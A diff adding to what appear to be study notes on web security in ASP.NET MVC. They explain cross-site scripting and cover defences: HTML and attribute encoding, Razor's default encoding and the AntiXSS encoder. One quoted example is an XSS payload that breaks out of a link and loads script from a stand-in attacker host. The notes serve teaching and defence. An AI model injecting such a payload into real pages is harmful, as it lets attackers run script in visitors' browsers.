@@ -1256,7 +1256,10 @@ public ActionResult Login(string returnUrl) {
 ```
 - Additionally, using HTTPS with Google authentication is important. 
 - Google reports a user who logs in once via HTTP and later via HTTPS as two different people. 
+
 ### UNDERSTANDING THE SECURITY VECTORS IN A WEB APPLICATION
+- ```Every bit of output on your pages should be HTML encoded or HTML attribute encoded. ```
+
 ### Threat: Cross-Site Scripting
 - cross-site scripting (XSS). 
 - XSS can be carried out in one of two ways:
@@ -1264,19 +1267,74 @@ public ActionResult Login(string returnUrl) {
 by a user entering nasty script commands into a website that accepts unsanitized user input 
 or by user input being directly displayed on a page
 ```
+-  ```unsanitized``` user input or by user input being directly displayed on a page. 
+- The first example is called ```passive injection```- whereby a user enters nastiness into a textbox, for example, and that script gets saved into a database and redisplayed later. 
+- The second is called ```active injection``` and involves a user entering nastiness into an input, which is immediately displayed onscreen
+- No validation is in place to tell you that the URL you’ve entered is invalid!
 - A cross-site request forgery (CSRF, pronounced C-surf, also known by the acronym XSRF) 
+-  you would probably do something like this: Even when you hover over the name in the post, you won’t see the injected script tag
+```
+"></a><script src="http://srizbitrojan.evil.example.com"></script> <a href="
+```
+- Active Injection 
+```
+Active XSS injection involves a user sending in malicious information that is immediately shown on the page 
+and is not stored in the database.
+```
+### Preventing XSS 
+- HTML Encode All Content : Most of the time, you can avoid XSS by using simple HTML encoding
+- ASP.NET 4 HTML Encoding
+```
+<% Html.Encode(Model.FirstName) %>
+can replace  shorter:
+<%: Model.FirstName %>
+```
+- The Razor view engine HTML encodes output by default, so a model property displayed using:
+```@Model.FirstName```
 
+- If you are absolutely certain that the data has already been sanitized or comes only from a trusted source (such as yourself), you can use an HTML helper to output the data verbatim:
+```@Html.Raw(Model.HtmlContent) ```
+-  Not all server controls protect against XSS (for example, Labels and Literals), 
 
+### Html.AttributeEncode and Url.Encode 
+- This replaces reserved characters in the URL with other characters (" " with %20, for example).
+```
+<a href="<%=Url.Action(AuthorUrl)%>"><%=AuthorUrl%></a>
+<a href="<%=Url.Action("index","home",new {name=ViewData["name"]})%>">Go home</a>
 
+You can avoid this by using encoding with Url. Encode or Html.AttributeEncode:
+<a href="<%=Url.Action("index","home",new {name=Html.AttributeEncode(ViewData["name"])})%>">Click here</a>
+or:
+<a href="<%=Url.Encode(Url.Action("index","home", new {name=ViewData["name"]}))%>">Click here</a>
 
+```
+- Never, ever trust any data that your user can somehow touch or use
 
-
-
-
-
-
-
-
+### JavaScript Encoding 
+- HTML encoding, not JavaScript encoding
+- That means that the hacker could take advantage of hex escape codes to put in any JavaScript code he or she wanted. 
+-  The narrow solution is to use the ```Ajax .JavaScriptStringEncode helper``` function to encode strings that are used in JavaScript, exactly as you would use Html.Encode for HTML strings.
+-  A more thorough solution is to use the ```AntiXSS library```.
+### Using AntiXSS as the Default Encoder for ASP.NET
+- AntiXSS uses a whitelist of allowed characters, whereas ASP.NET’s default implementation uses a limited blacklist of disallowed characters.
+- The AntiXSS library is focused on preventing security vulnerabilities in your applications, whereas ASP.NET encoding is primarily focused on preventing display problems due to “broken” HTML.
+- The AntiXSS encoder portion of the Microsoft Web Protection Library (WPL) is included with .NET 4.5 and higher. 
+- Just need to make a one-line addition to the httpRuntime section of your web.config:
+```
+<httpRuntime ... 
+encoderType="System.Web.Security.AntiXss.AntiXssEncoder,System.Web,  
+Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" />
+```
+- With that in place, any time you call Html.Encode or use an <%:%> HTML Encoding Code Block, the AntiXSS library encodes the text, which takes care of both HTML and JavaScript encoding.
+- The portions of the AntiXSS library included in .NET 4.5 are
+```
+- HtmlEncode, HtmlFormUrlEncode, and HtmlAttributeEncode 
+- XmlAttributeEncode and XmlEncode 
+- UrlEncode and UrlPathEncode
+- CssEncod 
+```
+-  @using statement to bring in the AntiXSS encoder namespace, and then you can use the Encoder.JavaScriptEncode helper function.
+```@using Microsoft.Security.Application ```
 
 
 
